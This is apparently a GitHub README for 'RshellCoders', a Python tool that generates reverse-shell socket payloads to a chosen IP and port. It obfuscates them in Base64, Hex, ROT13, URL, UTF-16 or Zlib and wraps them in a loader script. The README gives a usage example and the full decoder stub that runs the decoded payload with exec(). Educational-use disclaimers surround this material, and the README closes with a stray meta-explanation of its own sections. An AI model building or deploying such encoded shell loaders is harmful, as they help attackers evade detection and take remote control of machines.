# RshellCoders 
Payload Generator & Encoder is a Python tool that generates a custom payload to establish a network connection via a socket (using a specified IP and port) and encodes it in various formats (Base64, Hex, ROT13, URL, UTF-16, Zlib) 
```markdown 
# Payload Generator & Encoder 

**Payload Generator & Encoder** is a Python tool that generates a custom payload to connect to a remote server via socket, and then encodes it in various formats like Base64, Hex, ROT13, URL, UTF-16, and Zlib. This script can be used to create obfuscated payloads, often used in penetration testing or controlled environments to assess security. 

--- 

## 🚨 Disclaimer 

**This project is for educational purposes only.** You must obtain explicit permission before using this tool on a network or target machine. Using this tool to compromise systems without permission is illegal and may result in legal action. 

The author will not be responsible for malicious use of this code. Use it at your own risk. 

--- 

## 📜 Features 

- **Generate custom payload** to connect to a remote server via socket (using a given IP address and port). 
- **Encode the payload** in different formats: 
  - Base64 
  - Hex 
  - ROT13 
  - URL encoding 
  - UTF-16 
  - Zlib compression 
- **Generate a Python script** that can be run to decode and execute the payload. 
- **Interactive command line interface** to enter the necessary parameters and choose the encoding format. 

--- 

## ⚙️ Prerequisites 

- Python 3.x 
- Standard Python libraries (no external dependencies required) 

--- 

## 🛠 Installation 

1. Clone this repository to your machine: 
   ```bash 
[ https://github.com/HackfutSec/RshellCoders.git ``` 

2. Navigate to the project directory: 
   ```bash 
   cd RshellCoders 
   ``` 

--- 

## 🚀 Usage 

### 1. Run the script 

Run the `BlitzCoders.py` script: 

```bash 
python BlitzCoders.py 
``` 

### 2. Enter parameters 

- **IP**: Enter the target IP address. 
- **Port**: Enter the target port. 
- **Output filename**: Enter the filename for the generated Python script (without a `.py` extension). 
- **Encoding format**: Choose one of the following formats: 
  - **1**: Base64
  - **2**: Hex 
  - **3**: ROT13 
  - **4**: URL encoding 
  - **5**: UTF-16 
  - **6**: Zlib 

### 3. Execution example 

``` 
$ python BlitzCoders.py 

[CDX] Enter your IP: 192.168.1.10 
[CDX] Enter your port: 4444 
[CDX] Enter the output filename (without extension): payload_script 

[CDX] Choose the encoding format: 
1. base64 
2. hex 
3. rot13 
4. url 
5. utf-16 
6. zlib 

[CDX] Enter the number of the encoding format: 1 

[CDX] The script has been saved at: '/path/to/your/payload_script.py'. 
``` 

--- 

## 🧳 Code Explanation 

1. **Generating the Payload**: 
   - The `generate_payload(ip, port)` function generates a Python payload that connects to a server via a socket using the IP and port provided by the user. 
   
2. **Encoding the Payload**: 
   - The generated payload is then encoded in a format chosen by the user: Base64, Hex, ROT13, URL, UTF-16, or Zlib. 

3. **Creating the Python Script**: 
   - The `create_script(encoded_payload, encoding_format, output_filename)` function generates a Python script that includes the encoded payload and a decoding mechanism to execute the payload once the script is launched. 

4. **Payload Decoding and Execution**: 
   - When the generated script is executed, it decodes the payload according to the specified encoding and uses the `exec()` function to execute it. 

--- 

## ⚠️ License 

This project is licensed under **MIT**. See the [LICENSE](LICENSE) file for more details. 

--- 

## 📞 Contact 

- **Author**: Hackfut 
- **Contact**: [Telegram](https://t.me/HackfutSec) 

--- 

## 🔧 Contributions 

Contributions are welcome! If you want to improve this project or add new features, please submit a pull request. 

--- 

## 📝 Notes 

- **Ethics**: This tool should only be used in test environments where you have permission to perform security assessments. 
- **Malicious Use**: Using this tool to attack systems without authorization is illegal. 
- **Security Risks**: Be careful when using remote payloads, especially in production environments. 

--- 

### Example generated script: 

```python 
import base64 
import binascii 
import codecs 
import urllib.parse 
import zlib

def decode_payload(encoded_payload, encoding_format): 
    if encoding_format == 'base64': 
        return base64.b64decode(encoded_payload).decode('utf-8') 
    elif encoding_format == 'hex': 
        return binascii.unhexlify(encoded_payload).decode('utf-8') 
    elif encoding_format == 'rot13': 
        return codecs.decode(encoded_payload, 'rot_13') 
    elif encoding_format == 'url': 
        return urllib.parse.unquote(encoded_payload) 
    elif encoding_format == 'utf-16': 
        return encoded_payload.encode('latin-1').decode('utf-16') 
    elif encoding_format == 'zlib': 
        return zlib.decompress(bytes.fromhex(encoded_payload)).decode('utf-8') 
    else: 
        raise ValueError("Unrecognized encoding format.") 

if __name__ == "__main__": 
    encoded_payload = 'BASE64_ENCODED_PAYLOAD' 
    encoding_format = 'base64' 
    
    # Decode and execute the payload 
    exec(decode_payload(encoded_payload, encoding_format)) 
``` 

--- 

**Warning**: This script generates payloads that can potentially be used for malicious purposes. Be responsible in its use. 
``` 

--- 

### Explanation of sections: 

- **Usage**: Explains how the user interacts with the tool and provides an example of execution. 
- **Generating the payload**: Details the different steps the script follows to create a payload and encode it in different formats. 
- **License**: Reminds the user that the project is licensed under the MIT License and should be used ethically. 
- **Contact**: Provides a way to contact the author of the project. 

This will allow any user to understand how to use the tool and learn more about how it works.
